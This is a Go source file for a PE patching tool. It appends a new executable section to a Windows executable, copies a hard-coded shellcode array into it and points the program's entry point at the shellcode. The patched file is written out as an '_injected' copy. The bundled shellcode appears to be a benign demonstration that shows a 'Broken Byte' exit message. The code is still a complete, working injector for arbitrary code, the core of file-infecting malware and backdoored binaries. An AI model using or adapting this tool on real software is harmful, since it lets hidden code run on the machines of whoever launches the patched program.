package main

import (
	"PE_Patcher/pkg/pe"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"strings"
	"unsafe"
)

func addsection(buf []byte, outfilename string, shellcode []byte) {

	fmt.Printf("[!] The PE buf's length:%#v\n", len(buf))
	var sectionAlignment uint32
	var fileAlignment uint32

	var finalOutSize int

	switch pe.GetNtHeader(buf).CoffFileHeader.SizeOfOptionalHeader {

	case pe.SIZE_OF_OPTIONAL_HEADER_32:

		sectionAlignment = pe.GetOptHeader32(buf).SectionAlignment
		fileAlignment = pe.GetOptHeader32(buf).FileAlignment
		//sectionAlignment = pe.GetNtHeader(buf).OptionalHeader.OptionalHeader32.SectionAlignment
		//fileAlignment = pe.GetNtHeader(buf).OptionalHeader.OptionalHeader32.FileAlignment
		finalOutSize = len(buf) + int(P2ALIGNUP(uint32(len(shellcode)), fileAlignment))

	case pe.SIZE_OF_OPTIONAL_HEADER_64:
		sectionAlignment = pe.GetOptHeader64(buf).SectionAlignment
		fileAlignment = pe.GetOptHeader64(buf).FileAlignment
		//sectionAlignment = pe.GetNtHeader(buf).OptionalHeader.OptionalHeader64.SectionAlignment
		//fileAlignment = pe.GetNtHeader(buf).OptionalHeader.OptionalHeader64.FileAlignment
		finalOutSize = len(buf) + int(P2ALIGNUP(uint32(len(shellcode)), fileAlignment))

	default:
		// Error handling: Unknown optional header type.
		fmt.Printf("unknown NT headers format\n")
	}

	//Create a new buffer to store the modified content of the PE file.
	outbuf := make([]byte, finalOutSize)
	copy(outbuf, buf)

	fileHdr := pe.GetNtHeader(outbuf).CoffFileHeader
	secArr := pe.GetSectionArr(outbuf)
	//secArr := pe.GetSectionArr(outbuf)

	//firstSecHdr := &secArr[0]
	lastestSecHdr := &secArr[fileHdr.NumberOfSections-1]

	//Create a new section header.
	fmt.Printf("[+] create a new section to store shellcode\n")

	//Adding the section count.
	pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections++

	// Calculate the offset value of the section header.
	sectionHeadersOffset := int64(pe.GetDOSHeader(outbuf).E_LFANEW) + 4 + int64(pe.GetFileHeader(outbuf).SizeOfOptionalHeader) + int64(binary.Size(pe.GetNtHeader(outbuf).CoffFileHeader))

	// Calculate the offset value of the last section header.
	lastSectionOffset := sectionHeadersOffset + int64(binary.Size(pe.Section_HEADER{}))*int64(pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1)

	//create new section Header

	newSectionHdr := (*pe.Section_HEADER)(unsafe.Pointer(&outbuf[lastSectionOffset]))

	//newSectionHdr := new(pe.Section_HEADER)

	//Section Name
	newSectionHdr.Name = [8]byte{'.', 't', 'e', 's', 't', '.', 'm', 'e'}
	//newSectionHdr.Name = ".test.me"
	//set VirtualSize
	newSectionHdr.VirtualSize = P2ALIGNUP(uint32(len(shellcode)), sectionAlignment)
	//set VirtualAddress
	//lastSection => PE Last Section
	newSectionHdr.VirtualAddress = P2ALIGNUP((*lastestSecHdr).VirtualAddress+(*lastestSecHdr).VirtualSize, sectionAlignment)
	//set sizeOfRawData
	newSectionHdr.SizeOfRawData = uint32(len(shellcode))
	//set PointerToRawData
	newSectionHdr.PointerToRawData = (*lastestSecHdr).PointerToRawData + (*lastestSecHdr).SizeOfRawData
	//set Characteristics=>rwx
	newSectionHdr.Characteristics = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ

	fmt.Printf("[+] Section addition successful .\n")

	//size Of OptionalHeader
	sizeOfOptionalHeader := pe.GetNtHeader(outbuf).CoffFileHeader.SizeOfOptionalHeader

	switch sizeOfOptionalHeader {
	case pe.SIZE_OF_OPTIONAL_HEADER_32: //0xE0

		fmt.Printf("[+] repair virtual size.\n")

		for i := 1; i < int(pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections); i++ {
			pe.GetSectionArr(outbuf)[i-1].VirtualSize = pe.GetSectionArr(outbuf)[i].VirtualAddress - pe.GetSectionArr(outbuf)[i-1].VirtualAddress

		}

		fmt.Printf("[+] fix image size in memory.\n")
		//pe.GetNtHeader(outbuf).OptionalHeader.OptionalHeader32.SizeOfImage = pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualAddress + pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualSize
		pe.GetOptHeader32(outbuf).SizeOfImage = pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualAddress + pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualSize

		fmt.Printf("[+] point EP to shellcode\n")
		pe.GetOptHeader32(outbuf).AddressOfEntryPoint = newSectionHdr.VirtualAddress

	case pe.SIZE_OF_OPTIONAL_HEADER_64: //0xF0
		fmt.Printf("[+] repair virtual size.\n")
		for i := 1; i < int(pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections); i++ {

			pe.GetSectionArr(outbuf)[i-1].VirtualSize = pe.GetSectionArr(outbuf)[i].VirtualAddress - pe.GetSectionArr(outbuf)[i-1].VirtualAddress

		}

		fmt.Printf("[+] fix image size in memory.\n")

		pe.GetOptHeader64(outbuf).SizeOfImage = pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualAddress + pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualSize

		//pe.GetNtHeader(outbuf).OptionalHeader.OptionalHeader64.SizeOfImage = pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualAddress + pe.GetSectionArr(outbuf)[pe.GetNtHeader(outbuf).CoffFileHeader.NumberOfSections-1].VirtualSize

		//pe.GetNtHeader(outbuf).OptionalHeader.OptionalHeader64.SizeOfImage = 6400
		fmt.Printf("[+] point EP to shellcode\n")

		pe.GetOptHeader64(outbuf).AddressOfEntryPoint = newSectionHdr.VirtualAddress
		//pe.GetNtHeader(outbuf).OptionalHeader.OptionalHeader64.AddressOfEntryPoint = 6200

	}

	fmt.Printf("[+] Successfully corrected the PE file.\n")

	addshellcode := make([]byte, P2ALIGNUP(uint32(len(shellcode)), fileAlignment))

	copy(addshellcode, shellcode)

	copy(outbuf[newSectionHdr.PointerToRawData:], shellcode)

	outpath := strings.TrimSuffix(outfilename, ".exe") + "_injected.exe"

	// save to disk
	f, err := os.Create(outpath)
	if err != nil {
		panic(err)
	}
	//Generate the new PE file.
	f.Write(outbuf)
	defer f.Close()
	fmt.Printf("[+] Generate File: %s, size:%d \n", outpath, FileSize(outpath))

}

func FileSize(name string) int64 {

	fileinfo, err := os.Stat(name)

	if err != nil {
		log.Fatalln("Get File Info Failed", err)
	}

	return fileinfo.Size()
}

func main() {

	var shellcode = []byte{0x31, 0xd2, 0xb2, 0x30, 0x64, 0x8b, 0x12, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x1c, 0x8b, 0x42,
		0x08, 0x8b, 0x72, 0x20, 0x8b, 0x12, 0x80, 0x7e, 0x0c, 0x33, 0x75, 0xf2, 0x89, 0xc7, 0x03,
		0x78, 0x3c, 0x8b, 0x57, 0x78, 0x01, 0xc2, 0x8b, 0x7a, 0x20, 0x01, 0xc7, 0x31, 0xed, 0x8b,
		0x34, 0xaf, 0x01, 0xc6, 0x45, 0x81, 0x3e, 0x46, 0x61, 0x74, 0x61, 0x75, 0xf2, 0x81, 0x7e,
		0x08, 0x45, 0x78, 0x69, 0x74, 0x75, 0xe9, 0x8b, 0x7a, 0x24, 0x01, 0xc7, 0x66, 0x8b, 0x2c,
		0x6f, 0x8b, 0x7a, 0x1c, 0x01, 0xc7, 0x8b, 0x7c, 0xaf, 0xfc, 0x01, 0xc7, 0x68, 0x79, 0x74,
		0x65, 0x01, 0x68, 0x6b, 0x65, 0x6e, 0x42, 0x68, 0x20, 0x42, 0x72, 0x6f, 0x89, 0xe1, 0xfe,
		0x49, 0x0b, 0x31, 0xc0, 0x51, 0x50, 0xff, 0xd7}

	if len(os.Args) != 2 {
		fmt.Printf("[!] Usage: PE_Patcher <path/to/PEfile>")
		os.Exit(1)
	}

	filePath := os.Args[1]

	buf, err := readPEFile(filePath)

	if err != nil {
		fmt.Printf("[!] selected file not found.\n")
		os.Exit(1)
	}

	addsection(buf, filePath, shellcode)

}

func readPEFile(filename string) ([]byte, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}

	defer file.Close()

	fileinfo, err := file.Stat()
	if err != nil {
		return nil, err
	}
	filesize := fileinfo.Size()

	buf := make([]byte, filesize)

	_, err = file.Read(buf)

	if err != nil {
		return nil, err
	}
	return buf, nil

}

// P2ALIGNUP() Used to align the `size` to the next multiple of `align`.
func P2ALIGNUP(size, align uint32) uint32 {

	return (size + align - 1) &^ (align - 1)

}
